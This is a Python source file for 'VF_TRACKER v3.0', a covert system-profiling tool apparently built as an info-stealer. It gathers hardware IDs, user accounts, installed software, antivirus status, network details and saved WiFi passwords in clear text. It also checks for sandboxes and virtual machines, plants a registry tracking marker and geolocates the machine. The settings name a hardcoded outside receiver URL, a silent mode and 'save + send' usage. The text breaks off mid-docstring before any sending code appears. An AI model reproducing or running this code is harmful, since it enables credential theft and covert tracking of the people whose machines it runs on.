#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TRACKER v3.0 — Advanced System Identity Tracker                   ║
║     Part of the STORM_VX Architecture                                    ║
║                                                                           ║
║  Hardware Fingerprint | User Identity | Environment Detection            ║
║  Deep Network Recon   | Machine ID   | Smart Reporting                   ║
║                                                                           ║
║  FOR AUTHORIZED MONITORING ONLY!                                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  python VF_TRACKER.py                           # Auto-run, save + send
  python VF_TRACKER.py --silent                  # No console output
  python VF_TRACKER.py --no-server               # Local only, no send
  python VF_TRACKER.py --server http://example.com/receive.php
"""

import socket
import uuid
import urllib.request
import urllib.parse
import re
import ssl
import platform
import subprocess
import sys
import os
import json
import time
import hashlib
import argparse
from datetime import datetime

IS_WINDOWS = platform.system() == 'Windows'

# ═══════════════════════════════════════════════════════════════════════════════
# SERVER CONFIGURATION — Must match receive.php token!
# ═══════════════════════════════════════════════════════════════════════════════
VF_SECRET_TOKEN = 'STORM_VX_2024_SECURE_TOKEN_CHANGE_ME'
DEFAULT_SERVER_URL = 'http://namme.taskinoteam.ir/receive.php'

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY — Safe WMI/Command Runner
# ═══════════════════════════════════════════════════════════════════════════════

def _wmic(command_parts, timeout=8):
    """Run a wmic or system command safely and return stripped stdout lines."""
    try:
        result = subprocess.run(
            command_parts, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        # Remove header line if it looks like a wmic header
        if lines and any(hdr in lines[0].lower() for hdr in ['serialnumber', 'uuid', 'processorid', 'name', 'caption', 'product', 'version', 'last', 'fullname', 'description', 'layout', 'domain', 'driverversion', 'status', 'macaddress']):
            lines = lines[1:]
        return lines
    except Exception:
        return []


def _run_cmd(command_str, timeout=8):
    """Run a shell command safely and return stdout string."""
    try:
        result = subprocess.run(
            command_str, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        return result.stdout.strip()
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: HARDWARE FINGERPRINT
# ═══════════════════════════════════════════════════════════════════════════════

def get_motherboard_serial():
    """[HW-1] Motherboard Serial Number — never changes."""
    lines = _wmic(['wmic', 'baseboard', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_bios_uuid():
    """[HW-2] BIOS UUID — unique system identifier."""
    lines = _wmic(['wmic', 'csproduct', 'get', 'UUID'])
    return lines[0] if lines else "N/A"


def get_cpu_processor_id():
    """[HW-3] CPU Processor ID — unique per processor."""
    lines = _wmic(['wmic', 'cpu', 'get', 'processorid'])
    return lines[0] if lines else "N/A"


def get_disk_serial():
    """[HW-4] Disk Drive Serial Number — physical drive serial."""
    lines = _wmic(['wmic', 'diskdrive', 'get', 'serialnumber'])
    return lines[0] if lines else "N/A"


def get_gpu_info():
    """[HW-5] GPU Model and Driver Version."""
    if not IS_WINDOWS:
        # Try lspci on Linux
        try:
            result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
            gpu_lines = [l.strip() for l in result.stdout.split('\n') if 'VGA' in l or '3D' in l or 'Display' in l]
            if gpu_lines:
                return gpu_lines
        except Exception:
            pass
        return ["N/A (Windows WMI / lspci not available)"]
    lines = _wmic(['wmic', 'path', 'win32_videocontroller', 'get', 'name,driverversion'])
    gpus = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 2:
            version = parts[-1]
            name = ' '.join(parts[:-1])
            gpus.append(f"{name} (Driver: {version})")
        elif len(parts) == 1 and parts[0]:
            gpus.append(parts[0])
    return gpus if gpus else ["N/A"]


def get_battery_info():
    """[HW-6] Battery Info (laptops only)."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'path', 'win32_battery', 'get', 'name,estimatedchargeremaining'])
    if not lines:
        return "No battery detected (Desktop PC)"
    info = []
    for line in lines:
        if line:
            info.append(line.strip())
    return ' | '.join(info) if info else "No battery detected"


def generate_hwid(motherboard_serial, bios_uuid, cpu_id, disk_serial, mac_addr):
    """[HW-7] Generate unique Hardware ID (SHA256 hash of all HW IDs combined)."""
    raw = f"{motherboard_serial}|{bios_uuid}|{cpu_id}|{disk_serial}|{mac_addr}"
    return hashlib.sha256(raw.encode('utf-8')).hexdigest()


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: USER IDENTITY & ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════════

def get_windows_username():
    """[ID-1] Current Windows username."""
    try:
        return os.getlogin()
    except Exception:
        try:
            return os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        except Exception:
            return "Unknown"


def get_user_fullname():
    """[ID-2] Full name registered in Windows."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'fullname'])
    return lines[0] if lines else "N/A"


def get_last_login():
    """[ID-3] Last login time for current user."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'useraccount', 'where', f"name='{get_windows_username()}'", 'get', 'lastlogin'])
    return lines[0] if lines else "N/A"


def get_installed_users():
    """[ID-4] List of all user accounts on the system."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cut', '-d:', '-f1', '/etc/passwd'],
                                    capture_output=True, text=True, timeout=5)
            return [u for u in result.stdout.strip().split('\n') if u and not u.startswith('_')]
        except Exception:
            return ["N/A"]
    lines = _wmic(['wmic', 'useraccount', 'get', 'name'])
    return lines if lines else ["N/A"]


def get_domain_workgroup():
    """[ID-5] Domain or Workgroup name."""
    if not IS_WINDOWS:
        return "N/A"
    domain_lines = _wmic(['wmic', 'computersystem', 'get', 'domain'])
    wg_lines = _wmic(['wmic', 'computersystem', 'get', 'workgroup'])
    domain = domain_lines[0] if domain_lines else "?"
    workgroup = wg_lines[0] if wg_lines else "?"
    return f"Domain: {domain} | Workgroup: {workgroup}"


def get_installed_programs():
    """[ID-6] List of installed programs (name + version)."""
    if not IS_WINDOWS:
        return ["N/A (Windows WMI only)"]
    try:
        result = subprocess.run(
            ['wmic', 'product', 'get', 'name,version'],
            capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            # Skip header
            programs = []
            for line in lines[1:]:
                parts = line.rsplit(None, 1)
                if len(parts) == 2:
                    programs.append(f"{parts[0]} (v{parts[1]})")
                elif len(parts) == 1 and parts[0]:
                    programs.append(parts[0])
            return programs[:50]  # Limit to 50 programs
        return ["No programs found"]
    except subprocess.TimeoutExpired:
        return ["Timeout - WMI product query too slow"]
    except Exception:
        return ["Error retrieving"]


def get_running_processes():
    """[ID-7] Running processes (top 30 by name)."""
    try:
        if IS_WINDOWS:
            lines = _wmic(['wmic', 'process', 'get', 'name'], timeout=10)
        else:
            result = subprocess.run(['ps', '-eo', 'comm'], capture_output=True,
                                    text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()][1:]
        # Deduplicate and sort
        unique = sorted(set(lines))
        return unique[:30] if unique else ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_antivirus_info():
    """[ID-8] Antivirus software detection."""
    if not IS_WINDOWS:
        return ["N/A"]
    try:
        result = subprocess.run(
            ['wmic', '/namespace:\\\\root\\securitycenter2', 'path',
             'antivirusproduct', 'get', 'displayName,productState'],
            capture_output=True, text=True, timeout=8, encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            avs = []
            for line in lines[1:]:
                if line:
                    # Decode productState: 266240 = enabled, 393216 = disabled, 397312 = updating
                    parts = line.split()
                    if len(parts) >= 2:
                        state_hex = parts[-1]
                        try:
                            state_int = int(state_hex)
                            if state_int in [266240, 266256]:
                                status = "Enabled"
                            elif state_int in [393216, 393232]:
                                status = "Disabled"
                            elif state_int in [397312, 397328]:
                                status = "Updating"
                            else:
                                status = f"Unknown({state_hex})"
                            name = ' '.join(parts[:-1])
                            avs.append(f"{name} [{status}]")
                        except ValueError:
                            avs.append(line)
                    else:
                        avs.append(line)
            return avs if avs else ["No antivirus detected"]
        return ["No antivirus detected"]
    except Exception:
        return ["Access denied / Not available"]


def detect_vm_sandbox():
    """[ID-9] Detect Virtual Machine or Sandbox environment."""
    indicators = []
    if not IS_WINDOWS:
        return ["N/A (Windows detection only)"]

    # Check 1: MAC address vendor prefixes for VMs
    mac = get_mac_address().lower()
    vm_mac_prefixes = ['00:0c:29', '00:50:56', '00:05:69',  # VMware
                       '08:00:27', '0a:00:27',               # VirtualBox
                       '00:15:5d',                           # Hyper-V
                       '00:1c:42',                           # Parallels
                       '52:54:00']                           # QEMU/KVM
    for prefix in vm_mac_prefixes:
        if mac.startswith(prefix):
            indicators.append(f"VM MAC detected: {mac} (prefix: {prefix})")
            break

    # Check 2: VM-specific processes
    vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                    'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                    'prl_tools.exe', 'prl_cc.exe', 'spoolsv.exe']
    try:
        result = subprocess.run(['wmic', 'process', 'get', 'name'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        running = result.stdout.lower()
        for vp in vm_processes:
            if vp.lower() in running:
                indicators.append(f"VM process: {vp}")
    except Exception:
        pass

    # Check 3: VM-specific registry keys
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\VMware, Inc.'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VMware registry key found")
    except Exception:
        pass

    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\Oracle\\VirtualBox'],
            capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            indicators.append("VirtualBox registry key found")
    except Exception:
        pass

    # Check 4: System model via WMI
    model_lines = _wmic(['wmic', 'computersystem', 'get', 'model'])
    if model_lines:
        model = model_lines[0].lower()
        vm_keywords = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm',
                       'xen', 'hyper-v', 'parallels']
        for kw in vm_keywords:
            if kw in model:
                indicators.append(f"System model contains: {model_lines[0]}")
                break

    # Check 5: Low RAM check (VMs often have < 4GB)
    ram_lines = _wmic(['wmic', 'OS', 'get', 'TotalVisibleMemorySize'])
    if ram_lines:
        try:
            ram_kb = int(ram_lines[0].split()[0])
            ram_gb = ram_kb / 1024 / 1024
            if ram_gb < 4:
                indicators.append(f"Low RAM: {ram_gb:.1f} GB (possible VM)")
        except Exception:
            pass

    # Check 6: Single CPU core check
    cpu_count = os.cpu_count()
    if cpu_count and cpu_count == 1:
        indicators.append("Single CPU core (possible VM)")

    if not indicators:
        return ["No VM/Sandbox indicators detected (likely physical machine)"]
    return indicators


def get_timezone_locale():
    """[ID-10] Timezone and Locale information."""
    tz_name = time.tzname
    tz_offset = time.strftime('%z')
    try:
        import locale
        try:
            locale_str = locale.getlocale()[0] or "Unknown"
        except Exception:
            locale_str = os.environ.get('LANG', os.environ.get('LC_ALL', 'Unknown'))
    except Exception:
        locale_str = "Unknown"
    return f"TZ: {tz_name[0]} (UTC{tz_offset}) | Locale: {locale_str}"


def get_keyboard_layout():
    """[ID-11] Keyboard layout(s) in use."""
    if not IS_WINDOWS:
        return "N/A"
    lines = _wmic(['wmic', 'keyboard', 'get', 'layout'])
    if lines:
        return ', '.join(lines)
    # Fallback: check registry
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKCU\\Keyboard Layout\\Preload'],
            capture_output=True, text=True, timeout=3)
        if result.stdout:
            layouts = re.findall(r'REG_SZ\s+(\S+)', result.stdout)
            if layouts:
                return ', '.join(layouts)
    except Exception:
        pass
    return "Unknown"


def detect_vpn_proxy():
    """[ID-12] Detect VPN or Proxy usage."""
    indicators = []

    if IS_WINDOWS:
        # Check for VPN adapter names
        try:
            result = subprocess.run(['wmic', 'nic', 'get', 'name,netenabled'],
                                    capture_output=True, text=True, timeout=5,
                                    encoding='utf-8', errors='replace')
            vpn_keywords = ['vpn', 'tunnel', 'tap', 'tun', 'wireguard',
                            'nordvpn', 'expressvpn', 'proton', 'mullvad',
                            'cyberghost', 'surfshark', 'hideme', 'openvpn']
            for line in result.stdout.split('\n'):
                line_lower = line.lower()
                for kw in vpn_keywords:
                    if kw in line_lower and 'true' in line.lower():
                        indicators.append(f"VPN adapter: {line.strip()}")
                        break
        except Exception:
            pass

        # Check for proxy settings
        try:
            result = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyEnable'],
                capture_output=True, text=True, timeout=3)
            if '0x1' in result.stdout:
                indicators.append("System proxy: ENABLED")
                # Get proxy server
                result2 = subprocess.run(
                    ['reg', 'query',
                     'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                     '/v', 'ProxyServer'],
                    capture_output=True, text=True, timeout=3)
                proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
                if proxy_match:
                    indicators.append(f"Proxy server: {proxy_match.group(1).strip()}")
            elif '0x0' in result.stdout:
                indicators.append("System proxy: Disabled")
        except Exception:
            pass

    else:
        # Linux: check for tun/tap interfaces
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True,
                                    text=True, timeout=5)
            if 'tun' in result.stdout.lower() or 'tap' in result.stdout.lower():
                indicators.append("VPN interface (tun/tap) detected")
        except Exception:
            pass

        # Check environment for proxy
        for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
            val = os.environ.get(var)
            if val:
                indicators.append(f"Proxy env: {var}={val}")

    if not indicators:
        return ["No VPN/Proxy detected"]
    return indicators


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: DEEP NETWORK RECON
# ═══════════════════════════════════════════════════════════════════════════════

def get_current_wifi_info():
    """[NET-1,2] Current WiFi SSID and Signal Strength."""
    if not IS_WINDOWS:
        return "N/A", "N/A"
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        ssid_match = re.search(r'(?:SSID|Profile)\s*:\s*(.+)', result.stdout)
        signal_match = re.search(r'Signal\s*:\s*(.+)', result.stdout)

        ssid = ssid_match.group(1).strip() if ssid_match else "Not connected"
        signal = signal_match.group(1).strip() if signal_match else "N/A"
        return ssid, signal
    except Exception:
        return "Error", "Error"


def get_all_wifi_profiles():
    """[NET-3] All previously connected WiFi networks — movement history."""
    if not IS_WINDOWS:
        return ["N/A (Windows only)"]
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        profiles = re.findall(r':\s+(.+)\s*$', result.stdout, re.MULTILINE)
        return [p.strip() for p in profiles if p.strip()] if profiles else ["No WiFi profiles"]
    except Exception:
        return ["Error retrieving"]


def get_dns_servers():
    """[NET-4] DNS server addresses."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['cat', '/etc/resolv.conf'],
                                    capture_output=True, text=True, timeout=5)
            dns_lines = []
            for l in result.stdout.split('\n'):
                if l.strip().startswith('nameserver'):
                    ip = l.strip().replace('nameserver', '').strip()
                    if ip:
                        dns_lines.append(ip)
            return dns_lines if dns_lines else ["Not found"]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        dns_matches = re.findall(r'DNS Servers?\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return dns_matches if dns_matches else ["Not found"]
    except Exception:
        return ["Error"]


def get_dhcp_server():
    """[NET-5] DHCP server address."""
    if not IS_WINDOWS:
        return "N/A"
    try:
        result = subprocess.run(['ipconfig', '/all'],
                                capture_output=True, text=True, timeout=5,
                                encoding='utf-8', errors='replace')
        match = re.search(r'DHCP Server\s*\.+\s*:\s*([\d\.]+)', result.stdout)
        return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_all_network_adapters():
    """[NET-6] All network adapters with details."""
    if not IS_WINDOWS:
        try:
            result = subprocess.run(['ip', 'link', 'show'],
                                    capture_output=True, text=True, timeout=5)
            return [l.strip() for l in result.stdout.split('\n') if l.strip()][:10]
        except Exception:
            return ["Error"]
    try:
        result = subprocess.run(
            ['wmic', 'nic', 'get', 'name,macaddress,netenabled,speed'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )
        lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
        if len(lines) > 1:
            adapters = []
            for line in lines[1:]:
                if line:
                    adapters.append(line)
            return adapters if adapters else ["None found"]
        return ["None found"]
    except Exception:
        return ["Error retrieving"]


def get_proxy_settings():
    """[NET-8] Detailed proxy settings."""
    if not IS_WINDOWS:
        # Check env vars
        proxies = []
        for var in ['http_proxy', 'https_proxy', 'ftp_proxy', 'no_proxy']:
            val = os.environ.get(var, os.environ.get(var.upper()))
            if val:
                proxies.append(f"{var}={val}")
        return proxies if proxies else ["No proxy settings"]

    settings = []
    try:
        # WinHTTP proxy
        result = subprocess.run(['netsh', 'winhttp', 'show', 'proxy'],
                                capture_output=True, text=True, timeout=3,
                                encoding='utf-8', errors='replace')
        if 'Direct access' in result.stdout:
            settings.append("WinHTTP: Direct (no proxy)")
        else:
            proxy_match = re.search(r'Proxy Server\s*:\s*(.+)', result.stdout)
            if proxy_match:
                settings.append(f"WinHTTP Proxy: {proxy_match.group(1).strip()}")
    except Exception:
        pass

    try:
        # IE/System proxy
        result = subprocess.run(
            ['reg', 'query',
             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
             '/v', 'ProxyEnable'],
            capture_output=True, text=True, timeout=3)
        if '0x1' in result.stdout:
            result2 = subprocess.run(
                ['reg', 'query',
                 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
                 '/v', 'ProxyServer'],
                capture_output=True, text=True, timeout=3)
            proxy_match = re.search(r'REG_SZ\s+(.+)', result2.stdout)
            if proxy_match:
                settings.append(f"System Proxy: {proxy_match.group(1).strip()}")
        else:
            settings.append("System Proxy: Disabled")
    except Exception:
        pass

    return settings if settings else ["No proxy settings found"]


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 (CONT): MACHINE ID & REGISTRY MARKER
# ═══════════════════════════════════════════════════════════════════════════════

def generate_machine_id(hwid):
    """[MID-1] Generate a short Machine ID for quick identification."""
    return hashlib.md5(hwid.encode('utf-8')).hexdigest()[:16].upper()


def save_registry_marker(machine_id):
    """[MID-2] Save a marker in Windows Registry for re-identification."""
    if not IS_WINDOWS:
        return False, "N/A (Windows only)"
    try:
        result = subprocess.run(
            ['reg', 'add', 'HKLM\\SOFTWARE\\STORM_VX',
             '/v', 'MachineID', '/t', 'REG_SZ', '/d', machine_id, '/f'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return True, "Marker saved"
        return False, "Failed (needs Admin)"
    except Exception as e:
        return False, str(e)


def check_existing_marker():
    """[MID-3] Check if this machine was already tracked before."""
    if not IS_WINDOWS:
        return None, "N/A"
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\STORM_VX', '/v', 'MachineID'],
            capture_output=True, text=True, timeout=3
        )
        match = re.search(r'REG_SZ\s+(\S+)', result.stdout)
        if match:
            return match.group(1), "Previously tracked"
        return None, "First time"
    except Exception:
        return None, "First time (or access denied)"


def generate_maps_link(lat, lon):
    """[MID-4] Generate Google Maps link from coordinates."""
    if lat and lon and lat not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and lon not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635"):
        return f"https://www.google.com/maps?q={lat},{lon}"
    return "N/A"


# ═══════════════════════════════════════════════════════════════════════════════
# ORIGINAL FUNCTIONS (kept from v1)
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin():
    try:
        if IS_WINDOWS:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "Error"


def get_mac_address():
    mac = uuid.getnode()
    return ":".join([f"{(mac >> elements) & 0xff:02x}" for elements in range(0, 8*6, 8)][::-1])


def get_os_info():
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    processor = platform.processor()
    arch = platform.machine()
    os_str = f"{os_name} {os_release} ({arch})"
    cpu_str = f"{processor if processor else 'Unknown'}"
    return os_str, cpu_str


def get_system_uptime():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'],
                                    capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
            if len(lines) > 1:
                boot_time_str = lines[1]
                if boot_time_str:
                    return f"{boot_time_str[0:4]}/{boot_time_str[4:6]}/{boot_time_str[6:8]} - {boot_time_str[8:10]}:{boot_time_str[10:12]}"
        else:
            result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
            if result.stdout.strip():
                return result.stdout.strip()
        return "Not supported on this OS"
    except Exception:
        return "Error retrieving"


def get_hardware_resources():
    info = {}
    try:
        if IS_WINDOWS:
            mem_cmd = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'],
                                     capture_output=True, text=True, timeout=5)
            mem_lines = [l.strip() for l in mem_cmd.stdout.split('\n')
                         if l.strip() and 'TotalVisible' not in l]
            if mem_lines:
                parts = mem_lines[0].split()
                if len(parts) >= 2:
                    info['RAM'] = f"Total: {int(parts[0])/1024:.1f} GB | Free: {int(parts[1])/1024:.1f} GB"
            disk_cmd = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'],
                                      capture_output=True, text=True, timeout=5)
            for line in disk_cmd.stdout.split('\n'):
                if 'C:' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        info['Disk C:'] = f"Total: {int(parts[2])/(1024**3):.1f} GB | Free: {int(parts[1])/(1024**3):.1f} GB"
                        break
        else:
            try:
                with open('/proc/meminfo', 'r') as f:
                    meminfo = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            meminfo[parts[0].rstrip(':')] = int(parts[1])
                    total = meminfo.get('MemTotal', 0) / 1024
                    free = meminfo.get('MemAvailable', meminfo.get('MemFree', 0)) / 1024
                    info['RAM'] = f"Total: {total:.1f} GB | Free: {free:.1f} GB"
            except Exception:
                pass
        return info if info else {"Status": "No information found"}
    except Exception:
        return {"Error": "Failed to retrieve hardware info"}


def get_default_gateway():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True,
                                    timeout=5, encoding='utf-8')
            match = re.search(r'Default Gateway\.+:\s*([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
        else:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            match = re.search(r'default via ([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_active_connections():
    try:
        command = 'netstat -ano' if IS_WINDOWS else 'ss -tulpn'
        result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        established = [line.strip() for line in result.stdout.split('\n')
                       if 'ESTABLISHED' in line]
        return established[:5]
    except Exception:
        return ["Error retrieving connections"]


def get_arp_table():
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        devices = [line.strip() for line in result.stdout.split('\n')
                   if re.search(r'\d+\.\d+\.\d+\.\d+', line)]
        return devices[:5]
    except Exception:
        return ["ARP access blocked"]


def get_firewall_status():
    if not IS_WINDOWS:
        return ["Only supported on Windows"]
    try:
        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                capture_output=True, text=True, timeout=5, encoding='utf-8')
        profiles = [line.strip() for line in result.stdout.split('\n')
                    if 'ON' in line or 'OFF' in line]
        return profiles if profiles else ["Error retrieving"]
    except Exception:
        return ["Requires Admin access"]


def get_wifi_passwords():
    if not IS_WINDOWS:
        return [("Non-Windows OS", "This feature is only supported on Windows")]
    wifi_list = []
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                       capture_output=True, text=True, timeout=5,
                                       encoding='utf-8', errors='replace')
        profile_names = re.findall(r':\s+(.+)\s*$', profiles_cmd.stdout, re.MULTILINE)
        for name in profile_names:
            detail_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profile',
                                          f'name={name}', 'key=clear'],
                                         capture_output=True, text=True, timeout=5,
                                         encoding='utf-8', errors='replace')
            password_match = re.search(r'\u0645\u062d\u062a\u0648\u0627\u06cc \u06a9\u0644\u06cc\u062f\s*:\s*(.+)\s*$',
                                       detail_cmd.stdout, re.MULTILINE)
            if not password_match:
                password_match = re.search(r'Key Content\s*:\s*(.+)\s*$',
                                           detail_cmd.stdout, re.MULTILINE)
            password = password_match.group(1) if password_match else "(No access / Open)"
            wifi_list.append((name.strip(), password.strip()))
    except Exception as e:
        return [("Error", str(e))]
    return wifi_list


def get_info_from_numberia():
    """
    Public IP & geolocation from ipnumberia.com.
    Supports both English and Persian labels (Farsi).
    Uses multi-strategy coordinate extraction to handle any page format.
    """
    url = "https://ipnumberia.com/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    req = urllib.request.Request(url, headers=headers)
    ctx = ssl._create_unverified_context()

    public_ip = "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"     # یافت نشد
    isp = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    country = "\u0646\u0627\u0645\u0634\u062e\u0635"               # نامشخص
    city = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    coords = "\u0646\u0627\u0645\u0634\u062e\u0635"                 # نامشخص

    try:
        response = urllib.request.urlopen(req, timeout=10, context=ctx)
        html = response.read().decode('utf-8')

        # ─── 1. Find Public IP ───
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', html)
        if ip_match:
            public_ip = ip_match.group(0)

            # ─── 2. Context window around IP (for country, city, ISP) ───
            start = max(0, ip_match.start() - 2000)
            end = min(len(html), ip_match.end() + 2000)
            context_html = html[start:end]

            # Clean HTML tags in context slice
            clean_text = re.sub(r'<[^>]+>', ' ', context_html)
            clean_text = re.sub(r'\s+', ' ', clean_text)

            # ─── 3. Extract Country (English + Persian labels) ───
            c_match = re.search(
                r'(?:\u06a9\u0634\u0648\u0631|Country)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if c_match:
                country = c_match.group(1)

            # ─── 4. Extract City (English + Persian labels) ───
            city_match = re.search(
                r'(?:\u0634\u0647\u0631|City|\u0627\u0633\u062a\u0627\u0646|Province)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if city_match:
                city = city_match.group(1)

            # ─── 5. Extract Coordinates — Multi-Strategy ───
            # Also clean the FULL page for coordinate search (coords might be far from IP)
            full_clean = re.sub(r'<[^>]+>', ' ', html)
            full_clean = re.sub(r'\s+', ' ', full_clean)

            coords = _extract_coordinates(clean_text, full_clean)

            # ─── 6. Extract ISP (English + Persian labels) ───
            isp_match = re.search(
                r'(?:ISP|\u0627\u0631\u0627\u0626\u0647\s\u062f\u0647\u0646\u062f\u0647|'
                r'\u0633\u0631\u0648\u06cc\u0633\s\u062f\u0647\u0646\u062f\u0647|'
                r'\u0634\u0631\u06a9\u062a)\s*:?\s*([^\s,<]{2,60})',
                clean_text, re.IGNORECASE)
            if isp_match:
                isp = isp_match.group(1)
            else:
                # Fallback: keyword matching (Persian + English)
                isp_keywords = [
                    '\u0627\u06cc\u0631\u0627\u0646\u0633\u0644',     # ایرانسل
                    '\u0645\u062e\u0627\u0628\u0631\u0627\u062a',     # مخابرات
                    '\u0634\u0627\u062a\u0644',                       # شاتل
                    '\u0631\u0627\u06cc\u062a\u0644',                 # رایتل
                    '\u0632\u06cc\u0631\u0633\u0627\u062e\u062a',     # زیرساخت
                    '\u067e\u0627\u0631\u0633 \u0622\u0646\u0644\u0627\u06cc\u0646',  # پارس آنلاین
                    '\u0647\u0627\u06cc\u200c\u0648\u0628',           # های‌وب
                    '\u0627\u0641\u0631\u0627\u0646\u062a',           # افرانت
                    'Irancell', 'Mokhaberat', 'Shatel', 'Rightel',
                    'Pars Online', 'HiWeb', 'Afranet', 'Iran Cell',
                    'ADATA', 'Mobile Communication'
                ]
                for kw in isp_keywords:
                    if kw in clean_text:
                        isp = kw
                        break

        return public_ip, isp, country, city, coords

    except Exception as e:
        return public_ip, str(e), "\u062e\u0637\u0627", "\u062e\u0637\u0627", "\u062e\u0637\u0627"


def _extract_coordinates(context_text, full_text):
    """
    Extract geographic coordinates from ipnumberia.com text using multiple strategies.
    Handles all known formats: comma, space, degree symbol, N/E labels, Persian labels.

    Strategy 1: Labeled patterns (Lat/Lon keywords in English/Persian)
    Strategy 2: Simple decimal pairs (comma or space separated, with optional °)
    Strategy 3: Smart pair detection (find two decimals that look like coordinates)
